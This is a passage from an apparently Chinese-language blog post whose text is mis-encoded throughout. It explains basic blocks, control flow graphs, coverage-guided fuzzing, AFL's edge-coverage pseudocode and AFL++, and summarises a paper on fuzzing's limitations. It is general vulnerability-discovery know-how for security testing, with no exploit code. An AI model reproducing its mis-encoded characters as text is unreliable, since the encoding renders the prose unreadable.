ä¸ºä¸åŒçš„æ¡ä»¶æ‰§è¡Œä¸åŒçš„ä»£ç ã€‚åŸºæœ¬å—çš„å…³é”®ç‰¹æ€§æ˜¯ï¼šæ‰§è¡Œæ—¶ä»å…¥å£æŒ‡ä»¤å¼€å§‹ï¼Œä¸”ä¸ä¼šä¸­é€”è·³å‡ºã€‚åœ¨æ§åˆ¶æµå›¾ï¼ˆCFGï¼ŒControl Flow Graphï¼‰ä¸­ï¼Œæ¯ä¸ªåŸºæœ¬å—å¯¹åº”ä¸€ä¸ªèŠ‚ç‚¹ï¼ŒèŠ‚ç‚¹ä¹‹é—´çš„è¿çº¿è¡¨ç¤ºç¨‹åºçš„æ§åˆ¶æµã€‚</p><p>å¦‚ä¸‹ä¾‹ï¼š</p><p>å¦‚æœ<code>a</code>çš„å€¼ä¸º 1ï¼Œå³è¾“å‡º<code>true</code>ï¼Œå¦åˆ™è¾“å‡º<code>false</code>ã€‚è¿™é‡Œå°±æ„æˆäº†ä¸€ä¸ªåŸºæœ¬å—ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(a==<span class="hljs-number">1</span>)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;true&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;false&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†ä¸Šè¿°çš„ä»£ç æ‰§è¡Œé€»è¾‘ç”»æˆç¨‹åºæ‰§è¡Œæµç¨‹çš„å›¾ï¼ˆCFGï¼‰ã€‚</p><p><img src="/Linux/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/assets/graphviz.svg"></p><p>ä»£ç ä»<code>Start</code>å¼€å§‹æ‰§è¡Œï¼Œæ¯ä¸ªæ–¹æ¡†éƒ½ä»£è¡¨ä¸€ä¸ªåŸºæœ¬å—ã€‚</p><ul><li>åŸºäºç”Ÿæˆè¾“å…¥æ•°æ®fuzzï¼š1.éšæœº 2. åŸºäºæ¨¡æ¿ç”Ÿæˆï¼ˆå¦‚HTTPæŠ¥æ–‡ é‡Œé¢å„ä¸ªå­—æ®µåˆå¯åˆ†ä¸º å›ºå®šä¸å˜ ä»»æ„å˜åŠ¨ æœ‰é™å˜åŠ¨ï¼‰</li><li>åŸºäºå˜å¼‚-è¦†ç›–åˆ¶å¯¼fuzzï¼šæ ·æœ¬å˜å¼‚-&gt;è§¦å‘æ–°è·¯å¾„ï¼Œæ„ŸçŸ¥è¿›ç¨‹åé¦ˆ-&gt;åŸºäºåé¦ˆ å˜å¼‚æ ·æœ¬å†è¾“å…¥</li></ul><h3 id="åŸºäºè¦†ç›–ç‡çš„æ¨¡ç³Šæµ‹è¯•"><a href="#åŸºäºè¦†ç›–ç‡çš„æ¨¡ç³Šæµ‹è¯•" class="headerlink" title="åŸºäºè¦†ç›–ç‡çš„æ¨¡ç³Šæµ‹è¯•"></a>åŸºäºè¦†ç›–ç‡çš„æ¨¡ç³Šæµ‹è¯•</h3><p>coverage-guided fuzzing åŸç†</p><p>åŸºäºè¦†ç›–ç‡çš„æ¨¡ç³Šæµ‹è¯•ï¼ˆCoverage-guided fuzzingï¼‰æ˜¯ä¸€ç§é€šè¿‡æµ‹è¯•ç¨‹åºä¸åŒä»£ç è·¯å¾„æ¥å‘ç°æ½œåœ¨æ¼æ´çš„è‡ªåŠ¨åŒ–æŠ€æœ¯ã€‚è¿™ç§æ–¹æ³•ä¾èµ–äºè¦†ç›–ç‡ä¿¡æ¯ï¼Œæ—¨åœ¨é€šè¿‡ä¸æ–­åœ°ç”Ÿæˆæ–°çš„è¾“å…¥æ•°æ®ï¼Œè¦†ç›–æ›´å¤šçš„ä»£ç è·¯å¾„ï¼Œä»è€Œè§¦å‘ç¨‹åºä¸­çš„æ½œåœ¨æ¼æ´ã€‚</p><p>å·¥ä½œåŸç†ï¼š</p><ol><li><p><strong>åˆå§‹åŒ–</strong>ï¼šæ¨¡ç³Šæµ‹è¯•å™¨ä¼šç”Ÿæˆä¸€äº›åˆå§‹è¾“å…¥æ•°æ®ï¼Œé€šå¸¸è¿™äº›è¾“å…¥æ˜¯éšæœºçš„æˆ–è€…åŸºäºå·²æœ‰çš„æµ‹è¯•æ ·æœ¬ã€‚ç„¶åå°†è¿™äº›è¾“å…¥æ•°æ®æä¾›ç»™ç›®æ ‡ç¨‹åºè¿›è¡Œæµ‹è¯•ã€‚</p></li><li><p><strong>æ‰§è¡Œç¨‹åº</strong>ï¼šæ¯æ¬¡æ‰§è¡Œç¨‹åºæ—¶ï¼Œæ¨¡ç³Šæµ‹è¯•å™¨ä¼šç›‘è§†ç¨‹åºçš„æ‰§è¡Œè·¯å¾„ã€‚ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¼šè¿½è¸ªæ¯ä¸ªåŸºæœ¬å—ï¼ˆbasic blockï¼‰çš„è¦†ç›–æƒ…å†µã€‚è¿™æ„å‘³ç€å®ƒä¼šè®°å½•å“ªäº›ä»£ç è¡Œè¢«æ‰§è¡Œè¿‡ï¼Œå“ªäº›æ²¡æœ‰è¢«æ‰§è¡Œè¿‡ã€‚</p></li><li><p><strong>æ”¶é›†è¦†ç›–ç‡ä¿¡æ¯</strong>ï¼šæ¨¡ç³Šæµ‹è¯•å™¨é€šè¿‡æ’æ¡©æˆ–å…¶ä»–æ‰‹æ®µï¼Œæ”¶é›†ç¨‹åºæ‰§è¡Œçš„è¦†ç›–ç‡ä¿¡æ¯ï¼Œé€šå¸¸åŒ…æ‹¬ä»¥ä¸‹å‡ ç§å½¢å¼ï¼š</p><ul><li><p><strong>åŸºæœ¬å—è¦†ç›–ï¼ˆBasic Block Coverageï¼‰</strong>ï¼šè¿½è¸ªç¨‹åºæ‰§è¡Œæ—¶æ¯ä¸ªåŸºæœ¬å—æ˜¯å¦è¢«è§¦å‘ã€‚</p></li><li><p><strong>è·¯å¾„è¦†ç›–ï¼ˆPath Coverageï¼‰</strong>ï¼šè¿½è¸ªç¨‹åºæ‰§è¡Œçš„ä¸åŒè·¯å¾„ï¼Œå¸®åŠ©äº†è§£ç¨‹åºæ˜¯å¦éå†äº†æ‰€æœ‰å¯èƒ½çš„è·¯å¾„ã€‚</p></li><li><p><strong>åˆ†æ”¯è¦†ç›–ï¼ˆBranch Coverageï¼‰</strong>ï¼šè¿½è¸ªç¨‹åºä¸­æ¯ä¸ªæ¡ä»¶åˆ†æ”¯çš„æ‰§è¡Œæƒ…å†µï¼Œç¡®ä¿æ‰€æœ‰çš„åˆ†æ”¯æ¡ä»¶éƒ½å¾—åˆ°æµ‹è¯•ã€‚</p></li></ul></li><li><p><strong>ç”Ÿæˆæ–°è¾“å…¥</strong>ï¼šåŸºäºè¦†ç›–ç‡ä¿¡æ¯ï¼Œæ¨¡ç³Šæµ‹è¯•å™¨ä¼šç”Ÿæˆæ–°çš„è¾“å…¥æ•°æ®ï¼Œè¯•å›¾è¦†ç›–å°šæœªæµ‹è¯•çš„ä»£ç è·¯å¾„ã€‚é€šå¸¸ï¼Œæ¨¡ç³Šæµ‹è¯•å™¨ä¼šæ ¹æ®å½“å‰è¦†ç›–çš„è·¯å¾„é€‰æ‹©æ€§åœ°ç”Ÿæˆæ–°è¾“å…¥ï¼Œä¼˜å…ˆå°è¯•è¦†ç›–é‚£äº›å°šæœªè§¦å‘çš„ä»£ç è·¯å¾„ã€‚</p></li><li><p><strong>è¿­ä»£</strong>ï¼šé€šè¿‡ä¸æ–­ç”Ÿæˆæ–°çš„è¾“å…¥æ•°æ®å¹¶æ‰§è¡Œç¨‹åºï¼Œæ¨¡ç³Šæµ‹è¯•å™¨ä¼šå°½å¯èƒ½å¤šåœ°è¦†ç›–ç¨‹åºçš„ä»£ç è·¯å¾„ã€‚å¦‚æœæŸä¸ªè¾“å…¥æ•°æ®è§¦å‘äº†ç¨‹åºä¸­çš„å´©æºƒæˆ–å¼‚å¸¸è¡Œä¸ºï¼Œæ¨¡ç³Šæµ‹è¯•å™¨å°†å…¶è®°å½•ä¸‹æ¥ï¼Œä¾›åç»­åˆ†æã€‚</p></li></ol><p>é€šå¸¸æ‰€è¯´çš„åé¦ˆé©±åŠ¨æ¨¡ç³Šæµ‹è¯•ï¼ˆfeedback-driven fuzzerï¼‰æ˜¯æŒ‡æ¨¡ç³Šæµ‹è¯•å™¨ï¼ˆfuzzerï¼‰å¹¶ééšæ„ç”Ÿæˆéšæœºè¾“å…¥å’Œå˜å¼‚ï¼Œè€Œæ˜¯é€šè¿‡æ‰§è¡Œç»“æœçš„å¥½åæ¥å¼•å¯¼ä¸‹ä¸€æ¬¡ç”Ÿæˆæˆ–é€‰æ‹©çš„è¾“å‡ºã€‚æ ¹æ®åé¦ˆçš„æ¥æºï¼Œå¯ä»¥å¤§è‡´åˆ†ä¸ºä¸¤ç±»ï¼š</p><ul><li><p><strong>Coverage-guided</strong>ï¼ˆè¦†ç›–ç‡å¼•å¯¼ï¼‰ - é€šè¿‡ä»£ç è¦†ç›–ç‡æ¥å¼•å¯¼ï¼Œæ‰§è¡Œåˆ°çš„ä»£ç è¶Šå¤šè¶Šå¥½ã€‚</p></li><li><p><strong>Data-driven</strong>ï¼ˆæ•°æ®é©±åŠ¨ï¼‰ - è®©ç‰¹å®šæ•°æ®æˆ–å˜é‡çš„çŠ¶æ€å˜åŒ–è¶Šå¤šè¶Šå¥½ã€‚</p></li></ul><p>å¤§å¤šæ•°æ¨¡ç³Šæµ‹è¯•å™¨éƒ½æ˜¯ <strong>coverage-guided</strong> ç±»å‹ï¼Œå…¶ç›®çš„æ˜¯åœ¨ä¸€å®šæ—¶é—´å†…å°½å¯èƒ½æ‰§è¡Œæ›´å¤šçš„ä»£ç ã€‚å½“å‰è¾ƒæœ‰ä»£è¡¨æ€§çš„è¦†ç›–ç‡å¼•å¯¼æ¨¡ç³Šæµ‹è¯•å™¨æœ‰ï¼š</p><h3 id="ä»£ç è¦†ç›–ç‡"><a href="#ä»£ç è¦†ç›–ç‡" class="headerlink" title="ä»£ç è¦†ç›–ç‡"></a>ä»£ç è¦†ç›–ç‡</h3><p>ä»£ç è¦†ç›–ç‡çš„è®¡é‡å•ä½ï¼Œé€šå¸¸æœ‰3ç§ï¼š</p><ul><li>å‡½æ•°ï¼šä»£ç æ‰§è¡Œæ—¶è°ƒç”¨åˆ°å“ªäº›å‡½æ•°</li><li>åŸºæœ¬å—ï¼šä»¥æŒ‡ä»¤è·³è½¬ä¸ºä½œåˆ’åˆ†è¾¹ç•Œçš„</li><li>è¾¹ç•Œï¼šedgeç›¸æ¯”äºåŸºæœ¬å—å¤šè®°å½•äº†ä¸€äº›æ‰§è¡Œè¾¹ç•Œçš„ä¿¡æ¯ã€‚</li></ul><p>ä»£ç è¦†ç›–ç‡æ˜¯æ¨¡ç³Šæµ‹è¯•ä¸­ä¸€ä¸ªæå…¶é‡è¦çš„æ¦‚å¿µï¼Œ<strong>ä½¿ç”¨ä»£ç è¦†ç›–ç‡å¯ä»¥è¯„ä¼°å’Œæ”¹è¿›æµ‹è¯•è¿‡ç¨‹ï¼Œæ‰§è¡Œåˆ°çš„ä»£ç è¶Šå¤šï¼Œæ‰¾åˆ°bugçš„å¯èƒ½æ€§å°±è¶Šå¤§</strong>ï¼Œæ¯•ç«Ÿï¼Œåœ¨è¦†ç›–çš„ä»£ç ä¸­å¹¶ä¸èƒ½100%å‘ç°bugï¼Œåœ¨æœªè¦†ç›–çš„ä»£ç ä¸­å´æ˜¯100%æ‰¾ä¸åˆ°ä»»ä½•bugçš„ï¼Œæ‰€ä»¥æœ¬èŠ‚ä¸­å°±å°†è¯¦ç»†ä»‹ç»ä»£ç è¦†ç›–ç‡çš„ç›¸å…³æ¦‚å¿µã€‚</p><p>ä»£ç è¦†ç›–ç‡æ˜¯ä¸€ç§åº¦é‡ä»£ç çš„è¦†ç›–ç¨‹åº¦çš„æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯æŒ‡æºä»£ç ä¸­çš„æŸè¡Œä»£ç æ˜¯å¦å·²æ‰§è¡Œï¼›å¯¹äºŒè¿›åˆ¶ç¨‹åºï¼Œè¿˜å¯å°†æ­¤æ¦‚å¿µç†è§£ä¸ºæ±‡ç¼–ä»£ç ä¸­çš„æŸæ¡æŒ‡ä»¤æ˜¯å¦å·²æ‰§è¡Œã€‚å…¶è®¡é‡æ–¹å¼å¾ˆå¤šï¼Œä½†æ— è®ºæ˜¯GCCçš„GCOVè¿˜æ˜¯LLVMçš„SanitizerCoverageï¼Œéƒ½æä¾›å‡½æ•°ï¼ˆfunctionï¼‰ã€åŸºæœ¬å—ï¼ˆbasic-blockï¼‰ã€è¾¹ç•Œï¼ˆedgeï¼‰ä¸‰ç§çº§åˆ«çš„è¦†ç›–ç‡æ£€æµ‹ï¼Œæ›´å…·ä½“çš„ç»†èŠ‚å¯ä»¥å‚è€ƒLLVMçš„<a href="https://clang.llvm.org/docs/SanitizerCoverage.html">å®˜æ–¹æ–‡æ¡£</a>ã€‚</p><ul><li>åŸºæœ¬å—</li></ul><p>ç¼©å†™ä¸ºBBï¼ŒæŒ‡ä¸€ç»„é¡ºåºæ‰§è¡Œçš„æŒ‡ä»¤ï¼ŒBBä¸­ç¬¬ä¸€æ¡æŒ‡ä»¤è¢«æ‰§è¡Œåï¼Œåç»­çš„æŒ‡ä»¤ä¹Ÿä¼šè¢«å…¨éƒ¨æ‰§è¡Œï¼Œæ¯ä¸ªBBä¸­æ‰€æœ‰æŒ‡ä»¤çš„æ‰§è¡Œæ¬¡æ•°æ˜¯ç›¸åŒçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªBBå¿…é¡»æ»¡è¶³ä»¥ä¸‹ç‰¹å¾ï¼š</p><ul><li>åªæœ‰ä¸€ä¸ªå…¥å£ç‚¹ï¼ŒBBä¸­çš„æŒ‡ä»¤ä¸æ˜¯ä»»ä½•<strong>è·³è½¬æŒ‡ä»¤</strong>çš„ç›®æ ‡ã€‚</li><li>åªæœ‰ä¸€ä¸ªé€€å‡ºç‚¹ï¼Œåªæœ‰æœ€åä¸€æ¡æŒ‡ä»¤ä½¿æ‰§è¡Œæµç¨‹è½¬ç§»åˆ°å¦ä¸€ä¸ªBB</li></ul><p>ä¾‹å¦‚ä¸‹å›¾ä¸­çš„ä»£ç å°±å¯ä»¥è¢«åˆ‡å‰²ä¸º4ä¸ªåŸºæœ¬å—ï¼Œå¹³æ—¶æˆ‘ä»¬åœ¨IDAå›¾å½¢æ¨¡å¼ä¸­çœ‹åˆ°çš„å°±æ˜¯ä¸€ä¸ªä¸€ä¸ªçš„åŸºæœ¬å—</p><ul><li>è¾¹ï¼ˆedgeï¼‰</li></ul><p>AFLçš„<a href="http://lcamtuf.coredump.cx/afl/technical_details.txt">æŠ€æœ¯ç™½çš®ä¹¦</a>ä¸­æåˆ°fuzzeré€šè¿‡æ’æ¡©ä»£ç æ•è·è¾¹ï¼ˆedgeï¼‰è¦†ç›–ç‡ã€‚é‚£ä¹ˆä»€ä¹ˆæ˜¯edgeå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥å°†ç¨‹åºçœ‹æˆä¸€ä¸ªæ§åˆ¶æµå›¾ï¼ˆCFGï¼‰ï¼Œå›¾çš„æ¯ä¸ªèŠ‚ç‚¹è¡¨ç¤ºä¸€ä¸ªåŸºæœ¬å—ï¼Œè€Œedgeå°±è¢«ç”¨æ¥è¡¨ç¤ºåœ¨åŸºæœ¬å—ä¹‹é—´çš„è½¬è·³ã€‚çŸ¥é“äº†æ¯ä¸ªåŸºæœ¬å—å’Œè·³è½¬çš„æ‰§è¡Œæ¬¡æ•°ï¼Œå°±å¯ä»¥çŸ¥é“ç¨‹åºä¸­çš„æ¯ä¸ªè¯­å¥å’Œåˆ†æ”¯çš„æ‰§è¡Œæ¬¡æ•°ï¼Œä»è€Œè·å¾—æ¯”è®°å½•BBæ›´ç»†ç²’åº¦çš„è¦†ç›–ç‡ä¿¡æ¯ã€‚</p><ul><li>å…ƒç»„</li></ul><p>å…·ä½“åˆ°AFLçš„å®ç°ä¸­ï¼Œä½¿ç”¨äºŒå…ƒç»„(branch_src, branch_dst)æ¥è®°å½•<strong>å½“å‰åŸºæœ¬å—</strong>Â +Â <strong>å‰ä¸€åŸºæœ¬å—</strong>Â çš„ä¿¡æ¯ï¼Œä»è€Œè·å–ç›®æ ‡çš„æ‰§è¡Œæµç¨‹å’Œä»£ç è¦†ç›–æƒ…å†µï¼Œä¼ªä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">cur<span class="hljs-number">_</span>location = &lt;COMPILE<span class="hljs-number">_T</span>IME<span class="hljs-number">_</span>RANDOM&gt;;            <span class="hljs-comment">//ç”¨ä¸€ä¸ªéšæœºæ•°æ ‡è®°å½“å‰åŸºæœ¬å—</span><br><span class="hljs-keyword">shared</span><span class="hljs-number">_m</span>em[cur<span class="hljs-number">_</span>location ^ prev<span class="hljs-number">_</span>location]++;        <span class="hljs-comment">//å°†å½“å‰å—å’Œå‰ä¸€å—å¼‚æˆ–ä¿å­˜åˆ°shared_mem[]</span><br>prev<span class="hljs-number">_</span>location = cur<span class="hljs-number">_</span>location &gt;&gt; <span class="hljs-number">1</span>;                <span class="hljs-comment">//cur_locationå³ç§»1ä½åŒºåˆ†ä»å½“å‰å—åˆ°å½“å‰å—çš„è½¬è·³</span><br></code></pre></td></tr></table></figure><p>å®é™…æ’å…¥çš„æ±‡ç¼–ä»£ç ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œé¦–å…ˆä¿å­˜å„ç§å¯„å­˜å™¨çš„å€¼å¹¶è®¾ç½®ecx&#x2F;rcxï¼Œç„¶åè°ƒç”¨<code>__afl_maybe_log</code>ï¼Œè¿™ä¸ªæ–¹æ³•çš„å†…å®¹ç›¸å½“å¤æ‚ï¼Œè¿™é‡Œå°±ä¸å±•å¼€è®²äº†ï¼Œä½†å…¶ä¸»è¦åŠŸèƒ½å°±å’Œä¸Šé¢çš„ä¼ªä»£ç ç›¸ä¼¼ï¼Œç”¨äºè®°å½•è¦†ç›–ç‡ï¼Œæ”¾å…¥ä¸€å—å…±äº«å†…å­˜ä¸­ã€‚</p><h3 id="AFL-Fuzzæµç¨‹"><a href="#AFL-Fuzzæµç¨‹" class="headerlink" title="AFL Fuzzæµç¨‹"></a>AFL Fuzzæµç¨‹</h3><p><img src="/Linux/assets/Fuzz%E6%B5%81%E7%A8%8B.drawio.png"></p><p>ç¨‹åºï¼š</p><p>è¾“å…¥ã€è¾“å‡ºï¼Œç»™å‡ºåé¦ˆ</p><ul><li>æ‰‹åŠ¨æµ‹è¯•</li></ul><p>æ‰‹åŠ¨ç”Ÿæˆ data</p><ul><li>è‡ªåŠ¨åŒ–æµ‹è¯•</li></ul><p>éšæœºç”Ÿæˆdata</p><p>åŸºäºæ¨¡æ¿dataç”Ÿæˆfuzz</p><p>è§‚å¯Ÿè¿›ç¨‹æ˜¯å¦crash</p><p>ä¾‹å­ï¼š</p><p>æ¯”å¦‚å¯¹äº http æœåŠ¡å™¨çš„æ¨¡ç³Šæµ‹è¯•</p><p>è¦†ç›–ç‡æ¨¡ç³Šæµ‹è¯•</p><p>è¦†ç›–æµ‹è¯•-&gt;æ„ŸçŸ¥è¿›ç¨‹-&gt;è·¯å¾„åé¦ˆ-&gt;åŸºäºåé¦ˆå˜å¼‚æ•°æ®</p><p>AFL æ˜¯ä¸€ç§æµè¡Œçš„å¼€æºæ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Œä¸“é—¨ç”¨äºå‘ç°ç¨‹åºä¸­çš„æ¼æ´ã€‚å®ƒä¸»è¦é€šè¿‡è‡ªåŠ¨åŒ–åœ°ç”Ÿæˆè¾“å…¥æ•°æ®å¹¶å°†å…¶æä¾›ç»™ç¨‹åºï¼Œè§‚å¯Ÿç¨‹åºçš„å´©æºƒæˆ–å¼‚å¸¸è¡Œä¸ºï¼Œä»è€Œå‘ç°æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚</p><p>AFL++ æ˜¯ AFL çš„åŠ å¼ºç‰ˆï¼Œæ—¨åœ¨è§£å†³ AFL ä¸­çš„ä¸€äº›å±€é™æ€§å¹¶å¢å¼ºå…¶åŠŸèƒ½ã€‚AFL++ ä¿æŒäº† AFL çš„å¤§éƒ¨åˆ†åŠŸèƒ½ï¼Œä½†å¢åŠ äº†æ›´å¤šçš„ç‰¹æ€§å’Œæ€§èƒ½ä¼˜åŒ–ï¼Œä½¿å…¶æˆä¸ºç°ä»£æ¨¡ç³Šæµ‹è¯•çš„æ›´å¼ºå¤§å·¥å…·ã€‚æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ç›´æ¥å­¦ä¹  AFL++ã€‚</p><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><h3 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h3><p>Fuzz testingï¼ˆfuzzingï¼Œå³æ¨¡ç³Šæµ‹è¯•ï¼‰åœ¨æ£€æµ‹å®‰å…¨æ¼æ´ä¸­å¤§æ”¾å¼‚å½©ï¼Œå…¶é€šè¿‡ç”Ÿæˆå¤§é‡çš„æµ‹è¯•ç”¨ä¾‹ï¼ˆtest casesï¼‰å¹¶è§‚æµ‹æ‰§è¡Œç»“æœæ¥å¯»æ‰¾æ¼æ´ï¼Œå¹¶ä¸”å·²åœ¨å¤§é‡çš„åº”ç”¨ä¸­å‘ç°äº†ä¸Šåƒä¸ªæ¼æ´ã€‚è™½ç„¶éå¸¸é«˜æ•ˆï¼Œfuzz ä»ç¼ºä¹ç³»ç»ŸåŒ–çš„å¯¹å…¶ç¼ºé™·çš„åˆ†æã€‚</p><ul><li>fuzz éœ€è¦ç¼©å°è¾“å…¥ç©ºé—´ï¼ˆinput spaceï¼‰ä¸ç¼ºé™·ç©ºé—´ï¼ˆdefect spaceï¼Œè§¦å‘ç¼ºé™·çš„è¾“å…¥ï¼‰é—´çš„å·®è·ï¼›åœ¨ä¸€ä¸ªåº”ç”¨å½“ä¸­ï¼Œæ¼æ´ï¼ˆdefectsï¼‰çš„å­˜åœ¨æ˜¯åˆ†æ•£çš„ï¼ˆspareï¼‰ï¼Œè¿™æ„å‘³ç€ defects space è¦æ¯” input space å°å¾—å¤šã€‚</li><li>fuzzing ç”Ÿæˆå¤§é‡çš„æµ‹è¯•ç”¨ä¾‹è¿›è¡Œé‡å¤æµ‹è¯•â€”â€”è¿™éœ€è¦ä¸€ç§è‡ªåŠ¨åŒ–çš„æ–¹æ³•ï¼›ç”±äºæŸ¥è¯¢ä¸æ¼æ´çš„å¤æ‚æ€§ï¼Œè‡ªåŠ¨åŒ–åœ°æ‰§è¡Œä¸åŒçš„ç¨‹åºä¼šæ˜¯ä¸€ä¸ªæŒ‘æˆ˜ã€‚</li></ul><h3 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>è½¯ä»¶æ¼æ´æ˜¯è®¡ç®—æœºç³»ç»Ÿä¸­çš„ä¸€ä¸ªä¸¥é‡çš„é—®é¢˜ï¼Œè€Œ Fuzz testing å·²ç»æˆä¸ºæœ€æˆåŠŸçš„æ£€æµ‹ç¨‹åºæ¼æ´çš„æ–¹æ³•ä¹‹ä¸€ï¼Œå…¶é€šè¿‡ç”Ÿæˆå¤§é‡çš„æµ‹è¯•ç”¨ä¾‹æ¥é‡å¤æµ‹è¯•ç›®æ ‡ç¨‹åºå¹¶è§‚å¯Ÿå…¶å¼‚å¸¸ï¼ˆexceptionï¼‰â€”â€”å®‰å…¨æ¼æ´çš„æ ‡å¿—ï¼ˆindicatorï¼‰</p><p>Fuzzing é€šå¸¸æœ‰ç€ä¸€ç»„ç§å­ï¼ˆseedsï¼‰ï¼šinteresting inputsï¼Œæ–°çš„è¾“å…¥çš„ç”Ÿæˆåˆ™åŸºäºè¿™ç»„ç§å­è¿›è¡Œæ— é™çš„å˜å¼‚ï¼ˆmutateï¼‰</p><p>è™½ç„¶ fuzzing åœ¨å‘ç°å®‰å…¨æ¼æ´ä¸Šè·å¾—äº†å·¨å¤§çš„æˆåŠŸï¼Œåœ¨å¼€å‘é«˜æ•ˆçš„æ¼æ´æ£€æµ‹æ–¹æ¡ˆä¸Šä»å­˜åœ¨ç€ç¼ºé™·ï¼Œå¦‚ Fig.1 æ‰€ç¤ºï¼Œä¸‰ä¸ªä¸»è¦çš„ç¼ºé™·æ˜¯ï¼šè¾“å…¥ä¸­åˆ†æ•£çš„æ¼æ´ç©ºé—´ï¼Œä¸¥æ ¼çš„æœ‰æ•ˆè¾“å…¥ç©ºé—´ï¼Œå¤šç›®æ ‡çš„è‡ªåŠ¨åŒ–æ‰§è¡Œã€‚</p><p><img src="/assets/Pasted%20image%2020250621145238.png"></p><ul><li><strong>Gap 1: spare defect space of inputs.</strong>Â åœ¨åº”ç”¨ç¨‹åºä¸­çš„æ¼æ´åˆ†å¸ƒæ˜¯åˆ†æ•£çš„ï¼Œè€Œä»…æœ‰éƒ¨åˆ†ç‰¹å®šçš„è¾“å…¥èƒ½å¤Ÿè§¦å‘æ¼æ´ï¼›æµ…æ˜¾çš„æ¼æ´å¯ä»¥åœ¨çŸ­æ—¶é—´å†…è¢« fuzz åˆ°ï¼Œä½†è®¸å¤šå®‰å…¨æ¼æ´éœ€è¦æµ‹è¯•å¤æ‚çš„æ‰§è¡Œè·¯å¾„å¹¶è§£å†³ä¸¥æ ¼çš„è·¯å¾„çº¦æŸï¼Œå› æ­¤ä¸€ä¸ªé«˜æ•ˆçš„ fuzzing ç®—æ³•éœ€è¦åŒæ—¶å¯¹Â <em>å¾…æµ‹è¯•ç¨‹åº</em>Â ï¼ˆprogram under testï¼ŒÂ <strong>PUTs</strong>ï¼‰ä¸Â <em>å®‰å…¨ç¼ºé™·</em>Â ï¼ˆsecurity flawsï¼‰è¶³å¤Ÿç²¾é€šï¼Œä»¥åœ¨ä¸€ä¸ªæ›´æœ‰å¯èƒ½å­˜åœ¨æ¼æ´çš„ä»£ç åŒºåŸŸé©±åŠ¨è®¡ç®—èµ„æº</li><li><strong>Gap 2: strict valid input space.</strong>Â å¤§éƒ¨åˆ†ç¨‹åºæœ‰ç€è‡ªå·±çš„è¾“å…¥ç©ºé—´ï¼Œè€Œç°ä»£ç¨‹åºéƒ½ç›¸å½“å¤æ‚ï¼Œéœ€è¦æ›´å¤æ‚çš„ç‰¹åŒ–è¾“å…¥ç©ºé—´ï¼Œå› æ­¤å¦‚ä½•ç”Ÿæˆæœ‰æ•ˆè¾“å…¥åŒæ ·æ˜¯ä¸ªæŒ‘æˆ˜ï¼›æ­¤å¤–ï¼Œä¸ºäº†æé«˜ fuzzing çš„æ•ˆç‡ï¼Œç”Ÿæˆçš„è¾“å…¥åº”å½“ä½¿ç”¨ä¸åŒçš„æ‰§è¡ŒçŠ¶æ€ï¼ˆä¾‹å¦‚Â <em>ä»£ç è¦†ç›–ç‡</em>Â ï¼‰ï¼Œè¿™éœ€è¦æ›´å…ˆè¿›çš„æ–¹æ¡ˆæ¥ç”Ÿæˆæœ‰æ•ˆè¾“å…¥ï¼›è‹¥ç¼ºä¹å¯¹ PUTs çš„ç³»ç»ŸåŒ–åˆ†æï¼Œå‡ ä¹ä¸å¯èƒ½ç²¾ç¡®åœ°é™åˆ¶è¾“å…¥ç©ºé—´ï¼ˆä¾‹å¦‚ PDF æ–‡ä»¶çš„å˜å¼‚ç”Ÿæˆå¯èƒ½ä¼šè¿å PDF è§„èŒƒï¼‰</li><li><strong>Gap 3: various target.</strong>Â ç”±äº fuzzing å¤§é‡é‡å¤åœ°æµ‹è¯• PUTsï¼Œè¿™éœ€è¦é«˜æ•ˆçš„è‡ªåŠ¨åŒ–æ–¹æ³•ã€‚PUTs ä¸æ¼æ´éƒ½æ˜¯å¤šç§å¤šæ ·çš„ï¼Œæœ‰çš„ç¨‹åºå¯ä»¥ç®€å•ç›´æ¥åœ°è¢«è‡ªåŠ¨åŒ–åœ° fuzzï¼ˆä¾‹å¦‚å‘½ä»¤è¡Œç¨‹åºï¼‰ï¼Œä½†è®¸å¤šç¨‹åºåœ¨è‡ªåŠ¨åŒ–æµ‹è¯•å‰éƒ½éœ€è¦åšå¤§é‡çš„å·¥ä½œï¼ˆä¾‹å¦‚ç¡¬ä»¶ï¼‰ï¼›æ­¤å¤–ï¼Œå®‰å…¨ç¼ºé™·åŒæ ·éœ€è¦è‡ªåŠ¨åŒ–çš„ indicator ä»¥è®°å½•æ½œåœ¨çš„çœŸæ­£æ¼æ´ï¼Œ<strong>ç¨‹åºå´©æºƒ</strong>æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„ indicator å› ä¸ºå…¶å¯ä»¥è¢« OS è‡ªåŠ¨æ•è·ï¼Œä½†æœ‰çš„å®‰å…¨ç¼ºé™·<strong>å¹¶ä¸ä¼šè¡¨ç°å‡ºå´©æºƒ</strong>ï¼ˆä¾‹å¦‚æ¡ä»¶ç«äº‰ï¼‰ï¼Œè¿™éœ€è¦ç²¾å¿ƒè®¾è®¡çš„ 